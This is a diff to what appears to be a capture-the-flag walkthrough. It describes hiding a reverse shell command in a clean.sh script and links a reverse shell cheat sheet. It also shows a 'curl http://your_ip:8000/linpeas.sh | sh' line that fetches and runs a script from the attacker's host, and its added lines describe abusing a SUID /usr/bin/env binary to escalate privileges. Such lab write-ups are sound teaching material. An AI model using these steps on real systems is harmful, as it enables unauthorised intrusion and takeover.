@@ -50,7 +50,7 @@ So our next step are the following:
 Download the clean.sh script, 
 
 hide a command for a reverseshell inside 
--> Place to find a reverseshell https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md
+(Place to find a reverseshell https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md)
 
 [![https://imgur.com/MYn1gRG.png](https://imgur.com/MYn1gRG.png)](https://imgur.com/MYn1gRG.png)
 
@@ -78,9 +78,13 @@ curl http://your_ip:8000/linpeas.sh | sh you can get linpeas.sh and execute it.
 
 (Of course you need to download it first https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS)
 
+We find that /usr/bin/env has the SUID binary bit set so we can check that on GTFOBINs (https://gtfobins.github.io/)
+
 [![https://imgur.com/QhNXV9u.png](https://imgur.com/QhNXV9u.png)](https://imgur.com/QhNXV9u.png)
 
 [![https://imgur.com/LwpJgWs.png](https://imgur.com/LwpJgWs.png)](https://imgur.com/LwpJgWs.png)
+
+Now we can abuse it to escalate.
 
 [![https://imgur.com/RinrpKl.png](https://imgur.com/RinrpKl.png)](https://imgur.com/RinrpKl.png)
 
